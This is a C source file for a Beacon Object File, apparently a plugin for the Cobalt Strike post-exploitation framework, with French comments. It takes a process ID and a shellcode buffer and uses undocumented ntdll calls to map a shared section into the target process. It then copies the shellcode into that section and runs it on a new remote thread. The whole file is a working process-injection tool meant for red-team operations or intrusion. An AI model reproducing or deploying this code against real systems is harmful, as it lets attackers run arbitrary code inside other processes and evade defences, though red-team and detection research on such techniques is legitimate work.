#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include <tchar.h>
#include <stdio.h>

// Typedefs NT
typedef NTSTATUS(NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
#define ViewShare 1

void inject(const int pid, const CHAR* shellcode, SIZE_T shellcodeSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
        shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
    BeaconPrintf(CALLBACK_OUTPUT, "pid: %d\n", pid);

    HMODULE hNtdll = (HMODULE)KERNEL32$GetModuleHandleA("ntdll.dll");

	// resolve les fonctions NT
    pNtCreateSection   NtCreateSection = (pNtCreateSection)KERNEL32$GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    pNtCreateThreadEx  NtCreateThreadEx = (pNtCreateThreadEx)KERNEL32$GetProcAddress(hNtdll, "NtCreateThreadEx");

    // ouvrir le process cible
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenProcess failed: %lu\n", KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "hProcess = %p\n", hProcess);

	// section RWX (pas ouf je pense)
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { .QuadPart = shellcodeSize };
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateSection failed: 0x%lx\n", status);
        KERNEL32$CloseHandle(hProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "hSection = %p\n", hSection);

    // map in local process
    PVOID localView = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, (HANDLE)-1, &localView, 0, 0, NULL,
        &viewSize, ViewShare, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "NtMapViewOfSection (local) failed: 0x%lx\n", status);
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "localView = %p\n", localView);

    // map to target process
    PVOID remoteView = NULL;
    viewSize = 0;
    status = NtMapViewOfSection(hSection, hProcess, &remoteView, 0, 0, NULL,
        &viewSize, ViewShare, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "NtMapViewOfSection (remote) failed: 0x%lx\n", status);
        NtUnmapViewOfSection((HANDLE)-1, localView);
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "remoteView = %p\n", remoteView);

    // copier le shellcode dans la vue locale -> visible dans la vue remote automatiquement
    MSVCRT$memcpy(localView, shellcode, shellcodeSize);
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode copied to section\n");

    // unmap la vue locale (plus necessaire)
    NtUnmapViewOfSection((HANDLE)-1, localView);

    //creer un thread dans le process cible
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        remoteView, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateThreadEx failed: 0x%lx\n", status);
        NtUnmapViewOfSection(hProcess, remoteView);
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    KERNEL32$WaitForSingleObject(hThread, INFINITE);
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode executed successfully\n");

    KERNEL32$CloseHandle(hThread);
    NtUnmapViewOfSection(hProcess, remoteView);
    KERNEL32$CloseHandle(hSection);
    KERNEL32$CloseHandle(hProcess);
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);


    DWORD pid = BeaconDataInt(&parser);
    int shellcodeSizeInt = 0;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;

    if (!bofstart()) return;

    inject(pid, shellcode, shellcodeSize);

    printoutput(TRUE);
    bofstop();
}
#else
int main() { inject(0, NULL, 0); return 1; }
#endif